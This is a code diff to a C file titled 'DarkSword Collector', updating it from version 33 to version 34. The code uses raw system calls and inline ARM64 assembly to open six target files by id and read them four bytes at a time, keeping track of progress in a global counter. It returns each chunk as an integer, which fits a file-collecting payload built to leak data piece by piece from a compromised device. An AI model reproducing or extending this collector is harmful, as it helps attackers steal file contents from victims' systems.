@@ -1,5 +1,7 @@
 /**
- * DarkSword Collector v33 - Single var, no offset cap, EOF-driven switching
+ * DarkSword Collector v34 - Fixed 20 bytes per file, then switch
+ * g_ctx: bits 0-7 = chunk_within_file, bits 16-23 = file_id
+ * After 5 chunks (20 bytes), advance to next file.
  */
 
 static long _svc1(long n, long a) {
@@ -26,6 +28,7 @@ static long _svc4(long n, long a, long b, long c, long d) {
 #define SEEK_SET 0
 #define O_RDONLY 0
 #define NUM_FILES 6
+#define CHUNKS_PER_FILE 5
 
 static volatile int g_ctx = 0;
 
@@ -41,18 +44,22 @@ static const char *get_path(int id) {
     }
 }
 
-/* Use __attribute__((naked)) to prevent compiler touching stack for g_ctx */
 int ds_start(void) {
-    /* Read g_ctx directly via inline asm to ensure we see the latest value */
     int ctx;
     __asm__("ldr %w0, [%1]" : "=r"(ctx) : "r"(&g_ctx));
-
     int fid = (ctx >> 16) & 0xFF;
-    int off = ctx & 0xFFFF;
+    int chk = ctx & 0xFF;
 
     if (fid >= NUM_FILES) {
         __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
         return 0xFFFFFFFF;
+    }
+
+    /* Advance to next file after CHUNKS_PER_FILE chunks */
+    if (chk >= CHUNKS_PER_FILE) {
+        int nc = ((fid + 1) << 16);
+        __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
+        return 0xFF000000 | fid;
     }
 
     const char *path = get_path(fid);
@@ -69,18 +76,15 @@ int ds_start(void) {
         return 0xFE000000 | fid;
     }
 
-    if (off > 0) _svc4(SYS_lseek, fd, (long)off, SEEK_SET, 0);
+    int off = chk * 4;
+    _svc4(SYS_lseek, fd, (long)off, SEEK_SET, 0);
     unsigned char buf[4] = {0};
     int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
     _svc1(SYS_close, fd);
 
-    if (n < 1) {
-        int nc = (fid + 1) << 16;
-        __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
-        return 0xFF000000 | fid;
-    }
-
-    int nc = (fid << 16) | (off + n);
+    int nc = (fid << 16) | (chk + 1);
     __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
+
+    if (n < 1) return 0xEE000000 | fid;
     return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
 }
